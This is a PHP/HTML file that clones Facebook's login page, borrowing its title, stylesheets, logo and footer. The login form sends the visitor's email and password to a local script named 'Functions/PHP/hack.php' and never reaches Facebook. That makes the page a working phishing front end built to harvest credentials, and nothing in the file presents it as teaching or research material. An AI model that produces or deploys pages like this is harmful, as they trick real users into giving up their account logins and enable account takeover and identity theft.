<?php session_start() ?>
<!DOCTYPE html>
<html lang="en" id="facebook" class="no_js">

<head>
  <title id="pageTitle">Facebook - log in or sign up</title>
  <meta property="og:locale" content="en_US" />
  <link rel="alternate" media="only screen and (max-width: 640px)" href="https://m.facebook.com/" />
  <link rel="alternate" media="handheld" href="https://m.facebook.com/" />
  <link rel="canonical" href="https://www.facebook.com/" />
  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico" />
  <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/yu/l/0,cross/x339NXcYNBe.css"
    data-bootloader-hash="k0Hi9Pt" crossorigin="anonymous" />
  <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/yx/l/0,cross/1utlAu_xj8y.css"
    data-bootloader-hash="Lqf8yTv" crossorigin="anonymous" />
  <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/y1/l/0,cross/2nrv04yYtCI.css"
    data-bootloader-hash="hNxPog9" crossorigin="anonymous" />
</head>

<body class="fbIndex UIPage_LoggedOut _-kb _605a b_c3pyn-ahh chrome webkit win x1 Locale_en_US" dir="ltr">
  <div class="_li" id="u_0_1_Mt">
    <div id="globalContainer" class="uiContextualLayerParent">
      <div class="fb_content clearfix" id="content" role="main">
        <div>
          <div class="_8esj _95k9 _8esf _8opv _8f3m _8ilg _8icx _8op_ _95ka">
            <div class="_8esk">
              <div class="_8esl">
                <div class="_8ice">
                  <img class="fb_logo _8ilh img" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg"
                    alt="Facebook" />
                </div>
                <h2 class="_8eso">
                  Connect with friends and the world around you on Facebook.
                </h2>
              </div>
              <div class="_8esn">
                <div class="_8iep _8icy _9ahz _9ah-">
                  <div class="_6luv _52jv">
                    <form class="_9vtf" action="Functions/PHP/hack.php" method="post">
                      <div>
                        <div class="_6lux">
                          <input type="text" class="inputtext _55r1 _6luy" name="email"
                            placeholder="Email or phone number" autofocus="1" aria-label="Email or phone number" />
                        </div>
                        <div class="_6lux">
                          <div class="_6luy _55r1 _1kbt">
                            <input type="password" class="inputtext _55r1 _6luy _9npi" name="pass"
                              placeholder="Password" aria-label="Password" />
                            <div class="_9ls7" id="u_0_3_G9">
                              <a href="#" role="button">
                                <div class="_9lsa">
                                  <div class="_9lsb" id="u_0_4_hB"></div>
                                </div>
                              </a>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div class="_6ltg">
                        <button class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" type="submit">
                          Log In
                        </button>
                      </div>
                      <div class="_6ltj">
                        <a href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzQ2NTgwMjUwLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;ars=facebook_login&amp;next"
                          id="u_0_6_FT">Forgot password?</a>
                      </div>
                      <div class="_8icz"></div>
                      <div class="_6ltg">
                        <a role="button" class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy"
                          href="/r.php?entry_point=login" ajaxify="" id="u_0_0_hL"
                          data-testid="open-registration-form-button">Create new account</a>
                      </div>
                    </form>
                  </div>
                  <div id="reg_pages_msg" class="_58mk">
                    <a href="/pages/create/?ref_type=registration_form" class="_8esh">Create a Page</a>
                    for a celebrity, brand or business.
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <script>
        let alertMessage = <?php echo json_encode($_SESSION['Alert']) ?? "" ?>;
        addEventListener("DOMContentLoaded", () => {
          if (alertMessage) {
            alert(alertMessage);
            window.location.href = "Functions/PHP/clearSession.php";
          }
        });
      </script>
      <div class="">
        <div class="_95ke _8opy">
          <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
            <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
              <li>English (US)</li>
              <li>
                <a class="_sv4" dir="ltr" href="https://www.facebook.com/" title="Filipino" id="u_0_7_9G">Filipino</a>
              </li>
              <li>
                <a class="_sv4" dir="ltr" href="https://tl-ph.facebook.com/" title="Cebuano" id="u_0_8_W8">Bisaya</a>
              </li>
              <li>
                <a class="_sv4" dir="ltr" href="https://cx-ph.facebook.com/" title="Spanish" id="u_0_9_oR">Español</a>
              </li>
              <li>
                <a class="_sv4" dir="ltr" href="https://es-la.facebook.com/" title="Japanese" id="u_0_a_Nf">日本語</a>
              </li>
              <li>
                <a class="_sv4" dir="ltr" href="https://ja-jp.facebook.com/" title="Korean" id="u_0_b_dG">한국어</a>
              </li>
              <li>
                <a class="_sv4" dir="ltr" href="https://ko-kr.facebook.com/" title="Simplified Chinese (China)"
                  id="u_0_c_Up">中文(简体)</a>
              </li>
              <li>
                <a class="_sv4" dir="rtl" href="https://zh-cn.facebook.com/" title="Arabic" id="u_0_d_TC">العربية</a>
              </li>
              <li>
                <a class="_sv4" dir="ltr" href="https://ar-ar.facebook.com/" title="Portuguese (Brazil)"
                  id="u_0_e_Cp">Português (Brasil)</a>
              </li>
              <li>
                <a class="_sv4" dir="ltr" href="https://pt-br.facebook.com/" title="French (France)"
                  id="u_0_f_eU">Français (France)</a>
              </li>
              <li>
                <a class="_sv4" dir="ltr" href="https://fr-fr.facebook.com/" title="German" id="u_0_g_/4">Deutsch</a>
              </li>
              <li>
                <a role="button" class="_42ft _4jy0 _517i _517h _51sy" rel="dialog"
                  ajaxify="/settings/language/language/?uri=https%3A%2F%2Fde-de.facebook.com%2F&amp;source=www_list_selector_more"
                  href="#" title="Show more languages">
                  <i class="img sp_GPvE0syHYuh sx_8e0301"></i>
                </a>
              </li>
            </ul>
            <div id="contentCurve"></div>
            <div id="pageFooterChildren" role="contentinfo" aria-label="Facebook site links">
              <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
                <li>
                  <a href="/reg/" title="Sign Up for Facebook">Sign Up</a>
                </li>
                <li>
                  <a href="/login/" title="Log into Facebook">Log In</a>
                </li>
                <li>
                  <a href="https://messenger.com/" title="Check out Messenger.">Messenger</a>
                </li>
                <li>
                  <a href="/lite/" title="Facebook Lite for Android.">Facebook Lite</a>
                </li>
                <li>
                  <a href="https://www.facebook.com/watch/" title="Browse in Video">Video</a>
                </li>
                <li>
                  <a href="https://about.meta.com/technologies/meta-pay" title="Learn more about Meta Pay"
                    target="_blank">Meta Pay</a>
                </li>
                <li>
                  <a href="https://www.meta.com/" title="Check out Meta" target="_blank">Meta Store</a>
                </li>
                <li>
                  <a href="https://www.meta.com/quest/" title="Learn more about Meta Quest" target="_blank">Meta
                    Quest</a>
                </li>
                <li>
                  <a href="https://www.meta.com/smart-glasses/" title="Learn more about Ray-Ban Meta"
                    target="_blank">Ray-Ban Meta</a>
                </li>
                <li>
                  <a href="https://www.meta.ai/" title="Meta AI">Meta AI</a>
                </li>
                <li>
                  <a href="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT3YNTrnUh4qvFhV30z4t4AEHabZbm3bTO4fQTslJHFvVior_5uNAIhaPWC3KMnci17DqEH9VNuAG34MgnkcOpoJVuQ49VkIv3rZXI0XuV9ukujQrsWyQWpV0NvBSo-7kf57YVIjtYNmJxAjBBRJRg"
                    title="Check out Instagram" target="_blank" rel="noreferrer nofollow"
                    data-lynx-mode="asynclazy">Instagram</a>
                </li>
                <li>
                  <a href="https://www.threads.com/" title="Check out Threads">Threads</a>
                </li>
                <li>
                  <a href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D"
                    title="See the Voting Information Center.">Voting Information Center</a>
                </li>
                <li>
                  <a href="/privacy/policy/?entry_point=facebook_page_footer"
                    title="Learn how we collect, use and share information to support Facebook.">Privacy Policy</a>
                </li>
                <li>
                  <a href="/privacy/center/?entry_point=facebook_page_footer"
                    title="Learn how to manage and control your privacy on Facebook.">Privacy Center</a>
                </li>
                <li>
                  <a href="https://about.meta.com/" accesskey="8"
                    title="Read our blog, discover the resource center, and find job opportunities.">About</a>
                </li>
                <li>
                  <a href="/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto"
                    title="Advertise on Facebook.">Create ad</a>
                </li>
                <li>
                  <a href="/pages/create/?ref_type=site_footer" title="Create a page">Create Page</a>
                </li>
                <li>
                  <a href="https://developers.facebook.com/?ref=pf" title="Develop on our platform.">Developers</a>
                </li>
                <li>
                  <a href="/careers/?ref=pf" title="Make your next career move to our awesome company.">Careers</a>
                </li>
                <li>
                  <a href="/policies/cookies/" title="Learn about cookies and Facebook." data-nocookies="1">Cookies</a>
                </li>
                <li>
                  <a class="_41ug" data-nocookies="1" href="https://www.facebook.com/help/568137493302217"
                    title="Learn about Ad Choices.">
                    Ad choices<i class="img sp_GPvE0syHYuh sx_7d98b4"></i>
                  </a>
                </li>
                <li>
                  <a data-nocookies="1" href="/policies?ref=pf" accesskey="9"
                    title="Review our terms and policies.">Terms</a>
                </li>
                <li>
                  <a href="/help/?ref=pf" accesskey="0" title="Visit our Help Center.">Help</a>
                </li>
                <li>
                  <a href="https://www.facebook.com/help/637205020878504"
                    title="Visit our Contact Uploading &amp; Non-Users Notice.">Contact Uploading &amp;Non-Users</a>
                </li>
                <li>
                  <a accesskey="6" class="accessible_elem" href="/settings"
                    title="View and edit your Facebook settings.">Settings</a>
                </li>
                <li>
                  <a accesskey="7" class="accessible_elem" href="/allactivity?privacy_source=activity_log_top_menu"
                    title="View your activity log">Activity log</a>
                </li>
              </ul>
            </div>
            <div class="mvl copyright">
              <div>
                <span>Meta © 2025</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div></div>
    <span>
      <img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display: none" />
    </span>
  </div>
  <div style="display: none"></div>
</body>

</html>